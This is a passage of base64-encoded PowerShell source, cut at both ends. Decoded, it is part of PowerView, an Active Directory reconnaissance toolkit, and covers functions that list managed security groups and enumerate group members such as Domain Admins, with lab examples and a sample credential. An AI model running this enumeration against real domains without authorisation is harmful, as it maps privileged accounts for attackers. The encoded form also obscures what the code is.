kIHRvLgoKLlBBUkFNRVRFUiBTZWFyY2hTY29wZQoKU3BlY2lmaWVzIHRoZSBzY29wZSB0byBzZWFyY2ggdW5kZXIsIEJhc2UvT25lTGV2ZWwvU3VidHJlZSAoZGVmYXVsdCBvZiBTdWJ0cmVlKS4KCi5QQVJBTUVURVIgUmVzdWx0UGFnZVNpemUKClNwZWNpZmllcyB0aGUgUGFnZVNpemUgdG8gc2V0IGZvciB0aGUgTERBUCBzZWFyY2hlciBvYmplY3QuCgouUEFSQU1FVEVSIFNlcnZlclRpbWVMaW1pdAoKU3BlY2lmaWVzIHRoZSBtYXhpbXVtIGFtb3VudCBvZiB0aW1lIHRoZSBzZXJ2ZXIgc3BlbmRzIHNlYXJjaGluZy4gRGVmYXVsdCBvZiAxMjAgc2Vjb25kcy4KCi5QQVJBTUVURVIgVG9tYnN0b25lCgpTd2l0Y2guIFNwZWNpZmllcyB0aGF0IHRoZSBzZWFyY2hlciBzaG91bGQgYWxzbyByZXR1cm4gZGVsZXRlZC90b21ic3RvbmVkIG9iamVjdHMuCgouUEFSQU1FVEVSIENyZWRlbnRpYWwKCkEgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdIG9iamVjdCBvZiBhbHRlcm5hdGUgY3JlZGVudGlhbHMKZm9yIGNvbm5lY3Rpb24gdG8gdGhlIHRhcmdldCBkb21haW4uCgouRVhBTVBMRQoKR2V0LURvbWFpbk1hbmFnZWRTZWN1cml0eUdyb3VwIHwgRXhwb3J0LVBvd2VyVmlld0NTViAtTm9UeXBlSW5mb3JtYXRpb24gZ3JvdXAtbWFuYWdlcnMuY3N2CgpTdG9yZSBhIGxpc3Qgb2YgYWxsIHNlY3VyaXR5IGdyb3VwcyB3aXRoIG1hbmFnZXJzIGluIGdyb3VwLW1hbmFnZXJzLmNzdgoKLk9VVFBVVFMKClBvd2VyVmlldy5NYW5hZ2VkU2VjdXJpdHlHcm91cAoKQSBjdXN0b20gUFNPYmplY3QgZGVzY3JpYmluZyB0aGUgbWFuYWdlZCBzZWN1cml0eSBncm91cC4KIz4KCiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNTaG91bGRQcm9jZXNzJywgJycpXQogICAgW091dHB1dFR5cGUoJ1Bvd2VyVmlldy5NYW5hZ2VkU2VjdXJpdHlHcm91cCcpXQogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBWYWx1ZUZyb21QaXBlbGluZSA9ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJFRydWUpXQogICAgICAgIFtBbGlhcygnTmFtZScpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnQURTUGF0aCcpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlYXJjaEJhc2UsCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdEb21haW5Db250cm9sbGVyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VydmVyLAoKICAgICAgICBbVmFsaWRhdGVTZXQoJ0Jhc2UnLCAnT25lTGV2ZWwnLCAnU3VidHJlZScpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlYXJjaFNjb3BlID0gJ1N1YnRyZWUnLAoKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkUmVzdWx0UGFnZVNpemUgPSAyMDAsCgogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRTZXJ2ZXJUaW1lTGltaXQsCgogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFRvbWJzdG9uZSwKCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5CiAgICApCgogICAgQkVHSU4gewogICAgICAgICRTZWFyY2hlckFyZ3VtZW50cyA9IEB7CiAgICAgICAgICAgICdMREFQRmlsdGVyJyA9ICcoJihtYW5hZ2VkQnk9KikoZ3JvdXBUeXBlOjEuMi44NDAuMTEzNTU2LjEuNC44MDM6PTIxNDc0ODM2NDgpKScKICAgICAgICAgICAgJ1Byb3BlcnRpZXMnID0gJ2Rpc3Rpbmd1aXNoZWROYW1lLG1hbmFnZWRCeSxzYW1hY2NvdW50dHlwZSxzYW1hY2NvdW50bmFtZScKICAgICAgICB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VhcmNoQmFzZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoQmFzZSddID0gJFNlYXJjaEJhc2UgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlciddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyJ10gPSAkU2VydmVyIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWFyY2hTY29wZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoU2NvcGUnXSA9ICRTZWFyY2hTY29wZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUmVzdWx0UGFnZVNpemUnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1Jlc3VsdFBhZ2VTaXplJ10gPSAkUmVzdWx0UGFnZVNpemUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlclRpbWVMaW1pdCddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyVGltZUxpbWl0J10gPSAkU2VydmVyVGltZUxpbWl0IH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWN1cml0eU1hc2tzJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZWN1cml0eU1hc2tzJ10gPSAkU2VjdXJpdHlNYXNrcyB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVG9tYnN0b25lJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydUb21ic3RvbmUnXSA9ICRUb21ic3RvbmUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KICAgIH0KCiAgICBQUk9DRVNTIHsKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydEb21haW4nXSkgewogICAgICAgICAgICAkU2VhcmNoZXJBcmd1bWVudHNbJ0RvbWFpbiddID0gJERvbWFpbgogICAgICAgICAgICAkVGFyZ2V0RG9tYWluID0gJERvbWFpbgogICAgICAgIH0KICAgICAgICBlbHNlIHsKICAgICAgICAgICAgJFRhcmdldERvbWFpbiA9ICRFbnY6VVNFUkROU0RPTUFJTgogICAgICAgIH0KCiAgICAgICAgIyBnbyB0aHJvdWdoIHRoZSBsaXN0IG9mIHNlY3VyaXR5IGdyb3VwcyBvbiB0aGUgZG9tYWluIGFuZCBpZGVudGlmeSB0aG9zZSB3aG8gaGF2ZSBhIG1hbmFnZXIKICAgICAgICBHZXQtRG9tYWluR3JvdXAgQFNlYXJjaGVyQXJndW1lbnRzIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAkU2VhcmNoZXJBcmd1bWVudHNbJ1Byb3BlcnRpZXMnXSA9ICdkaXN0aW5ndWlzaGVkbmFtZSxuYW1lLHNhbWFjY291bnR0eXBlLHNhbWFjY291bnRuYW1lLG9iamVjdHNpZCcKICAgICAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzWydJZGVudGl0eSddID0gJF8ubWFuYWdlZEJ5CiAgICAgICAgICAgICROdWxsID0gJFNlYXJjaGVyQXJndW1lbnRzLlJlbW92ZSgnTERBUEZpbHRlcicpCgogICAgICAgICAgICAjICRTZWFyY2hlckFyZ3VtZW50cwogICAgICAgICAgICAjIHJldHJpZXZlIHRoZSBvYmplY3QgdGhhdCB0aGUgbWFuYWdlZEJ5IEROIHJlZmVycyB0bwogICAgICAgICAgICAkR3JvdXBNYW5hZ2VyID0gR2V0LURvbWFpbk9iamVjdCBAU2VhcmNoZXJBcmd1bWVudHMKICAgICAgICAgICAgIyBXcml0ZS1Ib3N0ICJHcm91cE1hbmFnZXI6ICRHcm91cE1hbmFnZXIiCiAgICAgICAgICAgICRNYW5hZ2VkR3JvdXAgPSBOZXctT2JqZWN0IFBTT2JqZWN0CiAgICAgICAgICAgICRNYW5hZ2VkR3JvdXAgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnR3JvdXBOYW1lJyAkXy5zYW1hY2NvdW50bmFtZQogICAgICAgICAgICAkTWFuYWdlZEdyb3VwIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0dyb3VwRGlzdGluZ3Vpc2hlZE5hbWUnICRfLmRpc3Rpbmd1aXNoZWRuYW1lCiAgICAgICAgICAgICRNYW5hZ2VkR3JvdXAgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnTWFuYWdlck5hbWUnICRHcm91cE1hbmFnZXIuc2FtYWNjb3VudG5hbWUKICAgICAgICAgICAgJE1hbmFnZWRHcm91cCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdNYW5hZ2VyRGlzdGluZ3Vpc2hlZE5hbWUnICRHcm91cE1hbmFnZXIuZGlzdGluZ3Vpc2hlZE5hbWUKCiAgICAgICAgICAgICMgZGV0ZXJtaW5lIHdoZXRoZXIgdGhlIG1hbmFnZXIgaXMgYSB1c2VyIG9yIGEgZ3JvdXAKICAgICAgICAgICAgaWYgKCRHcm91cE1hbmFnZXIuc2FtYWNjb3VudHR5cGUgLWVxIDB4MTAwMDAwMDApIHsKICAgICAgICAgICAgICAgICRNYW5hZ2VkR3JvdXAgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnTWFuYWdlclR5cGUnICdHcm91cCcKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlaWYgKCRHcm91cE1hbmFnZXIuc2FtYWNjb3VudHR5cGUgLWVxIDB4MzAwMDAwMDApIHsKICAgICAgICAgICAgICAgICRNYW5hZ2VkR3JvdXAgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnTWFuYWdlclR5cGUnICdVc2VyJwogICAgICAgICAgICB9CgogICAgICAgICAgICAkQUNMQXJndW1lbnRzID0gQHsKICAgICAgICAgICAgICAgICdJZGVudGl0eScgPSAkXy5kaXN0aW5ndWlzaGVkbmFtZQogICAgICAgICAgICAgICAgJ1JpZ2h0c0ZpbHRlcicgPSAnV3JpdGVNZW1iZXJzJwogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlciddKSB7ICRBQ0xBcmd1bWVudHNbJ1NlcnZlciddID0gJFNlcnZlciB9CiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaFNjb3BlJ10pIHsgJEFDTEFyZ3VtZW50c1snU2VhcmNoU2NvcGUnXSA9ICRTZWFyY2hTY29wZSB9CiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1Jlc3VsdFBhZ2VTaXplJ10pIHsgJEFDTEFyZ3VtZW50c1snUmVzdWx0UGFnZVNpemUnXSA9ICRSZXN1bHRQYWdlU2l6ZSB9CiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlclRpbWVMaW1pdCddKSB7ICRBQ0xBcmd1bWVudHNbJ1NlcnZlclRpbWVMaW1pdCddID0gJFNlcnZlclRpbWVMaW1pdCB9CiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1RvbWJzdG9uZSddKSB7ICRBQ0xBcmd1bWVudHNbJ1RvbWJzdG9uZSddID0gJFRvbWJzdG9uZSB9CiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgeyAkQUNMQXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CgogICAgICAgICAgICAjICMgVE9ETzogY29ycmVjdCEKICAgICAgICAgICAgIyAjIGZpbmQgdGhlIEFDTHMgdGhhdCByZWxhdGUgdG8gdGhlIGFiaWxpdHkgdG8gd3JpdGUgdG8gdGhlIGdyb3VwCiAgICAgICAgICAgICMgJHhhY2wgPSBHZXQtRG9tYWluT2JqZWN0QWNsIEBBQ0xBcmd1bWVudHMgLVZlcmJvc2UKICAgICAgICAgICAgIyAjICRBQ0xBcmd1bWVudHMKICAgICAgICAgICAgIyAjIGRvdWJsZS1jaGVjayB0aGF0IHRoZSBtYW5hZ2VyCiAgICAgICAgICAgICMgaWYgKCR4YWNsLk9iamVjdFR5cGUgLWVxICdiZjk2NzljMC0wZGU2LTExZDAtYTI4NS0wMGFhMDAzMDQ5ZTInIC1hbmQgJHhhY2wuQWNlVHlwZSAtZXEgJ0FjY2Vzc0FsbG93ZWQnIC1hbmQgKCR4YWNsLk9iamVjdFNpZCAtZXEgJEdyb3VwTWFuYWdlci5vYmplY3RzaWQpKSB7CiAgICAgICAgICAgICMgICAgICRNYW5hZ2VkR3JvdXAgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnTWFuYWdlckNhbldyaXRlJyAkVHJ1ZQogICAgICAgICAgICAjIH0KICAgICAgICAgICAgIyBlbHNlIHsKICAgICAgICAgICAgIyAgICAgJE1hbmFnZWRHcm91cCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdNYW5hZ2VyQ2FuV3JpdGUnICRGYWxzZQogICAgICAgICAgICAjIH0KCiAgICAgICAgICAgICRNYW5hZ2VkR3JvdXAgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnTWFuYWdlckNhbldyaXRlJyAnVU5LTk9XTicKCiAgICAgICAgICAgICRNYW5hZ2VkR3JvdXAuUFNPYmplY3QuVHlwZU5hbWVzLkluc2VydCgwLCAnUG93ZXJWaWV3Lk1hbmFnZWRTZWN1cml0eUdyb3VwJykKICAgICAgICAgICAgJE1hbmFnZWRHcm91cAogICAgICAgIH0KICAgIH0KfQoKCmZ1bmN0aW9uIEdldC1Eb21haW5Hcm91cE1lbWJlciB7CjwjCi5TWU5PUFNJUwoKUmV0dXJuIHRoZSBtZW1iZXJzIG9mIGEgc3BlY2lmaWMgZG9tYWluIGdyb3VwLgoKQXV0aG9yOiBXaWxsIFNjaHJvZWRlciAoQGhhcm1qMHkpICAKTGljZW5zZTogQlNEIDMtQ2xhdXNlICAKUmVxdWlyZWQgRGVwZW5kZW5jaWVzOiBHZXQtRG9tYWluU2VhcmNoZXIsIEdldC1Eb21haW5Hcm91cCwgR2V0LURvbWFpbkdyb3VwTWVtYmVyLCBDb252ZXJ0LUFETmFtZSwgR2V0LURvbWFpbk9iamVjdCwgQ29udmVydEZyb20tU0lEICAKCi5ERVNDUklQVElPTgoKQnVpbGRzIGEgZGlyZWN0b3J5IHNlYXJjaGVyIG9iamVjdCB1c2luZyBHZXQtRG9tYWluU2VhcmNoZXIsIGJ1aWxkcyBhIGN1c3RvbQpMREFQIGZpbHRlciBiYXNlZCBvbiB0YXJnZXRpbmcvZmlsdGVyIHBhcmFtZXRlcnMsIGFuZCBzZWFyY2hlcyBmb3IgdGhlIHNwZWNpZmllZApncm91cCBtYXRjaGluZyB0aGUgY3JpdGVyaWEuIEVhY2ggcmVzdWx0IGlzIHRoZW4gcmVib3VuZCBhbmQgdGhlIGZ1bGwgdXNlcgpvciBncm91cCBvYmplY3QgaXMgcmV0dXJuZWQuCgouUEFSQU1FVEVSIElkZW50aXR5CgpBIFNhbUFjY291bnROYW1lIChlLmcuIEdyb3VwMSksIERpc3Rpbmd1aXNoZWROYW1lIChlLmcuIENOPWdyb3VwMSxDTj1Vc2VycyxEQz10ZXN0bGFiLERDPWxvY2FsKSwKU0lEIChlLmcuIFMtMS01LTIxLTg5MDE3MTg1OS0zNDMzODA5Mjc5LTMzNjYxOTY3NTMtMTExNCksIG9yIEdVSUQgKGUuZy4gNGM0MzVkZDctZGM1OC00YjE0LTlhNWUtMWZkYjBlODBkMjAyKQpzcGVjaWZ5aW5nIHRoZSBncm91cCB0byBxdWVyeSBmb3IuIFdpbGRjYXJkcyBhY2NlcHRlZC4KCi5QQVJBTUVURVIgRG9tYWluCgpTcGVjaWZpZXMgdGhlIGRvbWFpbiB0byB1c2UgZm9yIHRoZSBxdWVyeSwgZGVmYXVsdHMgdG8gdGhlIGN1cnJlbnQgZG9tYWluLgoKLlBBUkFNRVRFUiBSZWN1cnNlCgpTd2l0Y2guIElmIHRoZSBncm91cCBtZW1iZXIgaXMgYSBncm91cCwgcmVjdXJzaXZlbHkgdHJ5IHRvIHF1ZXJ5IGl0cyBtZW1iZXJzIGFzIHdlbGwuCgouUEFSQU1FVEVSIFJlY3Vyc2VVc2luZ01hdGNoaW5nUnVsZQoKU3dpdGNoLiBVc2UgTERBUF9NQVRDSElOR19SVUxFX0lOX0NIQUlOIGluIHRoZSBMREFQIHNlYXJjaCBxdWVyeSB0byByZWN1cnNlLgpNdWNoIGZhc3RlciB0aGFuIG1hbnVhbCByZWN1cnNpb24sIGJ1dCBkb2Vzbid0IHJldmVhbCBjcm9zcy1kb21haW4gZ3JvdXBzLAphbmQgb25seSByZXR1cm5zIHVzZXIgYWNjb3VudHMgKG5vIG5lc3RlZCBncm91cCBvYmplY3RzIHRoZW1zZWx2ZXMpLgoKLlBBUkFNRVRFUiBMREFQRmlsdGVyCgpTcGVjaWZpZXMgYW4gTERBUCBxdWVyeSBzdHJpbmcgdGhhdCBpcyB1c2VkIHRvIGZpbHRlciBBY3RpdmUgRGlyZWN0b3J5IG9iamVjdHMuCgouUEFSQU1FVEVSIFNlYXJjaEJhc2UKClRoZSBMREFQIHNvdXJjZSB0byBzZWFyY2ggdGhyb3VnaCwgZS5nLiAiTERBUDovL09VPXNlY3JldCxEQz10ZXN0bGFiLERDPWxvY2FsIgpVc2VmdWwgZm9yIE9VIHF1ZXJpZXMuCgouUEFSQU1FVEVSIFNlcnZlcgoKU3BlY2lmaWVzIGFuIEFjdGl2ZSBEaXJlY3Rvcnkgc2VydmVyIChkb21haW4gY29udHJvbGxlcikgdG8gYmluZCB0by4KCi5QQVJBTUVURVIgU2VhcmNoU2NvcGUKClNwZWNpZmllcyB0aGUgc2NvcGUgdG8gc2VhcmNoIHVuZGVyLCBCYXNlL09uZUxldmVsL1N1YnRyZWUgKGRlZmF1bHQgb2YgU3VidHJlZSkuCgouUEFSQU1FVEVSIFJlc3VsdFBhZ2VTaXplCgpTcGVjaWZpZXMgdGhlIFBhZ2VTaXplIHRvIHNldCBmb3IgdGhlIExEQVAgc2VhcmNoZXIgb2JqZWN0LgoKLlBBUkFNRVRFUiBTZXJ2ZXJUaW1lTGltaXQKClNwZWNpZmllcyB0aGUgbWF4aW11bSBhbW91bnQgb2YgdGltZSB0aGUgc2VydmVyIHNwZW5kcyBzZWFyY2hpbmcuIERlZmF1bHQgb2YgMTIwIHNlY29uZHMuCgouUEFSQU1FVEVSIFNlY3VyaXR5TWFza3MKClNwZWNpZmllcyBhbiBvcHRpb24gZm9yIGV4YW1pbmluZyBzZWN1cml0eSBpbmZvcm1hdGlvbiBvZiBhIGRpcmVjdG9yeSBvYmplY3QuCk9uZSBvZiAnRGFjbCcsICdHcm91cCcsICdOb25lJywgJ093bmVyJywgJ1NhY2wnLgoKLlBBUkFNRVRFUiBUb21ic3RvbmUKClN3aXRjaC4gU3BlY2lmaWVzIHRoYXQgdGhlIHNlYXJjaGVyIHNob3VsZCBhbHNvIHJldHVybiBkZWxldGVkL3RvbWJzdG9uZWQgb2JqZWN0cy4KCi5QQVJBTUVURVIgQ3JlZGVudGlhbAoKQSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0gb2JqZWN0IG9mIGFsdGVybmF0ZSBjcmVkZW50aWFscwpmb3IgY29ubmVjdGlvbiB0byB0aGUgdGFyZ2V0IGRvbWFpbi4KCi5FWEFNUExFCgpHZXQtRG9tYWluR3JvdXBNZW1iZXIgIkRlc2t0b3AgQWRtaW5zIgoKR3JvdXBEb21haW4gICAgICAgICAgICAgOiB0ZXN0bGFiLmxvY2FsCkdyb3VwTmFtZSAgICAgICAgICAgICAgIDogRGVza3RvcCBBZG1pbnMKR3JvdXBEaXN0aW5ndWlzaGVkTmFtZSAgOiBDTj1EZXNrdG9wIEFkbWlucyxDTj1Vc2VycyxEQz10ZXN0bGFiLERDPWxvY2FsCk1lbWJlckRvbWFpbiAgICAgICAgICAgIDogdGVzdGxhYi5sb2NhbApNZW1iZXJOYW1lICAgICAgICAgICAgICA6IFRlc3RpbmcgR3JvdXAKTWVtYmVyRGlzdGluZ3Vpc2hlZE5hbWUgOiBDTj1UZXN0aW5nIEdyb3VwLENOPVVzZXJzLERDPXRlc3RsYWIsREM9bG9jYWwKTWVtYmVyT2JqZWN0Q2xhc3MgICAgICAgOiBncm91cApNZW1iZXJTSUQgICAgICAgICAgICAgICA6IFMtMS01LTIxLTg5MDE3MTg1OS0zNDMzODA5Mjc5LTMzNjYxOTY3NTMtMTEyOQoKR3JvdXBEb21haW4gICAgICAgICAgICAgOiB0ZXN0bGFiLmxvY2FsCkdyb3VwTmFtZSAgICAgICAgICAgICAgIDogRGVza3RvcCBBZG1pbnMKR3JvdXBEaXN0aW5ndWlzaGVkTmFtZSAgOiBDTj1EZXNrdG9wIEFkbWlucyxDTj1Vc2VycyxEQz10ZXN0bGFiLERDPWxvY2FsCk1lbWJlckRvbWFpbiAgICAgICAgICAgIDogdGVzdGxhYi5sb2NhbApNZW1iZXJOYW1lICAgICAgICAgICAgICA6IGFyb2JiaW5zLmEKTWVtYmVyRGlzdGluZ3Vpc2hlZE5hbWUgOiBDTj1BbmR5IFJvYmJpbnMgKGFkbWluKSxDTj1Vc2VycyxEQz10ZXN0bGFiLERDPWxvY2FsCk1lbWJlck9iamVjdENsYXNzICAgICAgIDogdXNlcgpNZW1iZXJTSUQgICAgICAgICAgICAgICA6IFMtMS01LTIxLTg5MDE3MTg1OS0zNDMzODA5Mjc5LTMzNjYxOTY3NTMtMTExMgoKLkVYQU1QTEUKCidEZXNrdG9wIEFkbWlucycgfCBHZXQtRG9tYWluR3JvdXBNZW1iZXIgLVJlY3Vyc2UKCkdyb3VwRG9tYWluICAgICAgICAgICAgIDogdGVzdGxhYi5sb2NhbApHcm91cE5hbWUgICAgICAgICAgICAgICA6IERlc2t0b3AgQWRtaW5zCkdyb3VwRGlzdGluZ3Vpc2hlZE5hbWUgIDogQ049RGVza3RvcCBBZG1pbnMsQ049VXNlcnMsREM9dGVzdGxhYixEQz1sb2NhbApNZW1iZXJEb21haW4gICAgICAgICAgICA6IHRlc3RsYWIubG9jYWwKTWVtYmVyTmFtZSAgICAgICAgICAgICAgOiBUZXN0aW5nIEdyb3VwCk1lbWJlckRpc3Rpbmd1aXNoZWROYW1lIDogQ049VGVzdGluZyBHcm91cCxDTj1Vc2VycyxEQz10ZXN0bGFiLERDPWxvY2FsCk1lbWJlck9iamVjdENsYXNzICAgICAgIDogZ3JvdXAKTWVtYmVyU0lEICAgICAgICAgICAgICAgOiBTLTEtNS0yMS04OTAxNzE4NTktMzQzMzgwOTI3OS0zMzY2MTk2NzUzLTExMjkKCkdyb3VwRG9tYWluICAgICAgICAgICAgIDogdGVzdGxhYi5sb2NhbApHcm91cE5hbWUgICAgICAgICAgICAgICA6IFRlc3RpbmcgR3JvdXAKR3JvdXBEaXN0aW5ndWlzaGVkTmFtZSAgOiBDTj1UZXN0aW5nIEdyb3VwLENOPVVzZXJzLERDPXRlc3RsYWIsREM9bG9jYWwKTWVtYmVyRG9tYWluICAgICAgICAgICAgOiB0ZXN0bGFiLmxvY2FsCk1lbWJlck5hbWUgICAgICAgICAgICAgIDogaGFybWoweQpNZW1iZXJEaXN0aW5ndWlzaGVkTmFtZSA6IENOPWhhcm1qMHksQ049VXNlcnMsREM9dGVzdGxhYixEQz1sb2NhbApNZW1iZXJPYmplY3RDbGFzcyAgICAgICA6IHVzZXIKTWVtYmVyU0lEICAgICAgICAgICAgICAgOiBTLTEtNS0yMS04OTAxNzE4NTktMzQzMzgwOTI3OS0zMzY2MTk2NzUzLTExMDgKCkdyb3VwRG9tYWluICAgICAgICAgICAgIDogdGVzdGxhYi5sb2NhbApHcm91cE5hbWUgICAgICAgICAgICAgICA6IERlc2t0b3AgQWRtaW5zCkdyb3VwRGlzdGluZ3Vpc2hlZE5hbWUgIDogQ049RGVza3RvcCBBZG1pbnMsQ049VXNlcnMsREM9dGVzdGxhYixEQz1sb2NhbApNZW1iZXJEb21haW4gICAgICAgICAgICA6IHRlc3RsYWIubG9jYWwKTWVtYmVyTmFtZSAgICAgICAgICAgICAgOiBhcm9iYmlucy5hCk1lbWJlckRpc3Rpbmd1aXNoZWROYW1lIDogQ049QW5keSBSb2JiaW5zIChhZG1pbiksQ049VXNlcnMsREM9dGVzdGxhYixEQz1sb2NhbApNZW1iZXJPYmplY3RDbGFzcyAgICAgICA6IHVzZXIKTWVtYmVyU0lEICAgICAgICAgICAgICAgOiBTLTEtNS0yMS04OTAxNzE4NTktMzQzMzgwOTI3OS0zMzY2MTk2NzUzLTExMTIKCi5FWEFNUExFCgpHZXQtRG9tYWluR3JvdXBNZW1iZXIgLURvbWFpbiB0ZXN0bGFiLmxvY2FsIC1JZGVudGl0eSAnRGVza3RvcCBBZG1pbnMnIC1SZWN1cnNlVWluZ01hdGNoaW5nUnVsZQoKR3JvdXBEb21haW4gICAgICAgICAgICAgOiB0ZXN0bGFiLmxvY2FsCkdyb3VwTmFtZSAgICAgICAgICAgICAgIDogRGVza3RvcCBBZG1pbnMKR3JvdXBEaXN0aW5ndWlzaGVkTmFtZSAgOiBDTj1EZXNrdG9wIEFkbWlucyxDTj1Vc2VycyxEQz10ZXN0bGFiLERDPWxvY2FsCk1lbWJlckRvbWFpbiAgICAgICAgICAgIDogdGVzdGxhYi5sb2NhbApNZW1iZXJOYW1lICAgICAgICAgICAgICA6IGhhcm1qMHkKTWVtYmVyRGlzdGluZ3Vpc2hlZE5hbWUgOiBDTj1oYXJtajB5LENOPVVzZXJzLERDPXRlc3RsYWIsREM9bG9jYWwKTWVtYmVyT2JqZWN0Q2xhc3MgICAgICAgOiB1c2VyCk1lbWJlclNJRCAgICAgICAgICAgICAgIDogUy0xLTUtMjEtODkwMTcxODU5LTM0MzM4MDkyNzktMzM2NjE5Njc1My0xMTA4CgpHcm91cERvbWFpbiAgICAgICAgICAgICA6IHRlc3RsYWIubG9jYWwKR3JvdXBOYW1lICAgICAgICAgICAgICAgOiBEZXNrdG9wIEFkbWlucwpHcm91cERpc3Rpbmd1aXNoZWROYW1lICA6IENOPURlc2t0b3AgQWRtaW5zLENOPVVzZXJzLERDPXRlc3RsYWIsREM9bG9jYWwKTWVtYmVyRG9tYWluICAgICAgICAgICAgOiB0ZXN0bGFiLmxvY2FsCk1lbWJlck5hbWUgICAgICAgICAgICAgIDogYXJvYmJpbnMuYQpNZW1iZXJEaXN0aW5ndWlzaGVkTmFtZSA6IENOPUFuZHkgUm9iYmlucyAoYWRtaW4pLENOPVVzZXJzLERDPXRlc3RsYWIsREM9bG9jYWwKTWVtYmVyT2JqZWN0Q2xhc3MgICAgICAgOiB1c2VyCk1lbWJlclNJRCAgICAgICAgICAgICAgIDogUy0xLTUtMjEtODkwMTcxODU5LTM0MzM4MDkyNzktMzM2NjE5Njc1My0xMTEyCgouRVhBTVBMRQoKR2V0LURvbWFpbkdyb3VwICphZG1pbiogLVByb3BlcnRpZXMgc2FtYWNjb3VudG5hbWUgfCBHZXQtRG9tYWluR3JvdXBNZW1iZXIKCi5FWEFNUExFCgonQ049RW50ZXJwcmlzZSBBZG1pbnMsQ049VXNlcnMsREM9dGVzdGxhYixEQz1sb2NhbCcsICdEb21haW4gQWRtaW5zJyB8IEdldC1Eb21haW5Hcm91cE1lbWJlcgoKLkVYQU1QTEUKCiRTZWNQYXNzd29yZCA9IENvbnZlcnRUby1TZWN1cmVTdHJpbmcgJ1Bhc3N3b3JkMTIzIScgLUFzUGxhaW5UZXh0IC1Gb3JjZQokQ3JlZCA9IE5ldy1PYmplY3QgU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWwoJ1RFU1RMQUJcZGZtLmEnLCAkU2VjUGFzc3dvcmQpCkdldC1Eb21haW5Hcm91cE1lbWJlciAtQ3JlZGVudGlhbCAkQ3JlZCAtSWRlbnRpdHkgJ0RvbWFpbiBBZG1pbnMnCgouRVhBTVBMRQoKR2V0LURvbWFpbiB8IFNl